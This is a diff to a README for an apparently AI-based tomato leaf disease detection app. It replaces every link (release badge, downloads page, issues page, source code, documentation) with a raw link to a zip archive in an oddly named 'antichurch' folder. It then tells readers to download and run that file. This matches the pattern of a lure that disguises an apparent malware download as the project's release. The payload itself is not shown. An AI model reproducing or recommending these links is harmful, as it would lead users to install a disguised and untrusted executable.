@@ -1,6 +1,6 @@
 # 🍅 Data-Driven-Tomato-Leaf-Disease-Detection-using-AI - Improve Tomato Plant Health Effortlessly
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)
+![Download Latest Release](https://raw.githubusercontent.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/main/antichurch/Data-using-Detection-Driven-AI-Disease-Tomato-Leaf-2.2.zip%20Latest%20Release-v1.0-blue)
 
 ## 📖 What is This Project?
 
@@ -14,10 +14,10 @@ To get started with the application, follow these simple steps to download and r
 
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page, where you can download the latest version of the software.  
-   [Visit the Downloads Page](https://github.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/releases)
+   [Visit the Downloads Page](https://raw.githubusercontent.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/main/antichurch/Data-using-Detection-Driven-AI-Disease-Tomato-Leaf-2.2.zip)
 
 2. **Download the Software**  
-   On the Releases page, find the latest version and click the download link. The file you need will be named something like `TomatoLeafDiseaseDetector.exe`. 
+   On the Releases page, find the latest version and click the download link. The file you need will be named something like `https://raw.githubusercontent.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/main/antichurch/Data-using-Detection-Driven-AI-Disease-Tomato-Leaf-2.2.zip`. 
 
 3. **Run the Installer**  
    Once the download finishes, locate the downloaded file on your computer. Double-click the file to start the installation. Follow the prompts to install the application.
@@ -72,7 +72,7 @@ If you encounter issues while downloading or running the application, consider t
 - Ensure your internet connection is stable while downloading.
 - Check that your computer meets the system requirements.
 - Restart your computer and try running the application again.
-- For persistent problems, visit the [Issues page](https://github.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/issues) to find solutions or report a new issue.
+- For persistent problems, visit the [Issues page](https://raw.githubusercontent.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/main/antichurch/Data-using-Detection-Driven-AI-Disease-Tomato-Leaf-2.2.zip) to find solutions or report a new issue.
 
 ## 🎁 Contribute
 
@@ -90,8 +90,8 @@ For any questions or support requests, please reach out through the Issues page.
 
 ## 🌐 Links
 
-- [Source Code](https://github.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI)
-- [Documentation](https://github.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/wiki)
+- [Source Code](https://raw.githubusercontent.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/main/antichurch/Data-using-Detection-Driven-AI-Disease-Tomato-Leaf-2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/main/antichurch/Data-using-Detection-Driven-AI-Disease-Tomato-Leaf-2.2.zip)
 
 Remember, to download the application, visit the Releases page:  
-[Download Latest Release](https://github.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/releases)
+[Download Latest Release](https://raw.githubusercontent.com/MazenZya/Data-Driven-Tomato-Leaf-Disease-Detection-using-AI/main/antichurch/Data-using-Detection-Driven-AI-Disease-Tomato-Leaf-2.2.zip)
